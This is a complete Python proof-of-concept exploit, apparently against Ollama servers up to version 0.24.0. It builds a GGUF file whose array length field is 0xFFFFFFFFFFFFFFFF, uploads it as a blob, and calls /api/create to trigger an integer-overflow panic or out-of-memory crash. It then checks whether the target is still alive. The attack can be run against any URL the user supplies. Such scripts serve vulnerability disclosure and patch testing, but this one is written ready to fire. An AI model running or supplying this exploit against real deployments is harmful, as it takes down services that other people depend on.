#!/usr/bin/env python3
"""
PoC: GGUF Parser Integer Overflow DoS (Chain A)
================================================
Vulnerability: In fs/ggml/gguf.go readGGUFArray(), the array length 'n' is
read as uint64 from the GGUF blob, then cast to int for make([]T, int(n)).
On 64-bit systems, maxArraySize is -1 (no limit from /api/create), so a huge
uint64 value causes make() to either:
  - Panic with "runtime error: makeslice: len out of range" (if n > max int)
  - Attempt to allocate absurd amounts of memory (OOM kill)

Attack path:
  1. Craft a malicious GGUF file with an array whose length field is 0xFFFFFFFFFFFFFFFF
  2. Upload it as a blob to the Ollama server
  3. Call /api/create referencing that blob
  4. Ollama's GGUF decoder reads the array length, casts uint64→int, panics

Target: Ollama <= 0.24.0 (unpatched)
"""

import struct
import hashlib
import sys
import json
import requests
import argparse
from pathlib import Path


def craft_gguf_overflow(
    array_element_count: int = 0xFFFFFFFFFFFFFFFF,
    array_element_type: int = 0,  # 0 = uint8
    key_name: str = "general.architecture",
) -> bytes:
    """Build a minimal GGUF file that triggers integer overflow in readGGUFArray."""
    buf = bytearray()
    buf += struct.pack('<I', 0x46554747)          # magic: "GGUF"
    buf += struct.pack('<I', 3)                     # version: 3
    buf += struct.pack('<Q', 0)                     # tensor_count: 0
    buf += struct.pack('<Q', 1)                     # kv_count: 1

    key_bytes = key_name.encode('utf-8')
    buf += struct.pack('<Q', len(key_bytes))        # key length
    buf += key_bytes                                 # key data
    buf += struct.pack('<I', 9)                     # value type: ARRAY (9)
    buf += struct.pack('<Q', array_element_type)    # element type (uint8 = 0)
    buf += struct.pack('<Q', array_element_count)   # element count — OVERFLOW HERE
    return bytes(buf)


def upload_blob(ollama_url: str, data: bytes) -> str:
    """Upload a blob to Ollama and return the digest."""
    digest = 'sha256:' + hashlib.sha256(data).hexdigest()
    url = f"{ollama_url}/api/blobs/{digest}"
    print(f"[*] Uploading blob ({len(data)} bytes)")
    resp = requests.post(url, data=data, timeout=30)
    if resp.status_code in (201, 409):
        print(f"[+] Blob uploaded: {digest}")
        return digest
    else:
        print(f"[-] Upload failed: HTTP {resp.status_code}: {resp.text}")
        sys.exit(1)


def trigger_overflow(ollama_url: str, blob_digest: str, model_name: str = "overflow-test"):
    """Call /api/create with modelfile referencing the malicious blob."""
    modelfile = f"FROM {blob_digest}"
    url = f"{ollama_url}/api/create"
    print(f"[*] Triggering overflow via POST /api/create")
    resp = requests.post(url, json={"name": model_name, "modelfile": modelfile}, timeout=30)
    print(f"[*] Response: HTTP {resp.status_code}")
    print(f"[*] Body: {resp.text[:500]}")
    if resp.status_code >= 500 or "out of range" in resp.text or "panic" in resp.text:
        print(f"[+] Overflow likely triggered!")
    elif resp.status_code == 200:
        print(f"[?] Request succeeded — check server logs")


def check_alive(ollama_url: str) -> bool:
    try:
        return requests.get(f"{ollama_url}/api/tags", timeout=5).status_code == 200
    except requests.exceptions.ConnectionError:
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC: GGUF Integer Overflow DoS against Ollama")
    parser.add_argument("--target", "-t", default="http://192.168.0.17:11434", help="Ollama server URL")
    parser.add_argument("--overflow-val", type=lambda x: int(x, 0), default=0xFFFFFFFFFFFFFFFF, help="Array element count")
    parser.add_argument("--model-name", default="overflow-test", help="Model name for /api/create")
    parser.add_argument("--save-only", action="store_true", help="Only craft and save the GGUF file")
    parser.add_argument("--output", default="evil.gguf", help="Output file for --save-only")
    parser.add_argument("--blob-digest", default=None, help="Skip upload, use existing blob digest")
    args = parser.parse_args()

    print("=" * 60)
    print("  GGUF Integer Overflow DoS PoC")
    print(f"  Target: {args.target}")
    print(f"  Overflow value: {hex(args.overflow_val)}")
    print("=" * 60)

    gguf_data = craft_gguf_overflow(array_element_count=args.overflow_val)
    print(f"\n[*] Crafted GGUF: {len(gguf_data)} bytes")

    if args.save_only:
        Path(args.output).write_bytes(gguf_data)
        digest = hashlib.sha256(gguf_data).hexdigest()
        print(f"[+] Saved to {args.output}")
        print(f"[+] Upload: curl -X POST {args.target}/api/blobs/sha256:{digest} --data-binary @{args.output}")
        return

    if args.blob_digest:
        blob_digest = args.blob_digest
    else:
        blob_digest = upload_blob(args.target, gguf_data)

    trigger_overflow(args.target, blob_digest, args.model_name)

    print(f"\n[*] Server alive: {check_alive(args.target)}")


if __name__ == "__main__":
    main()
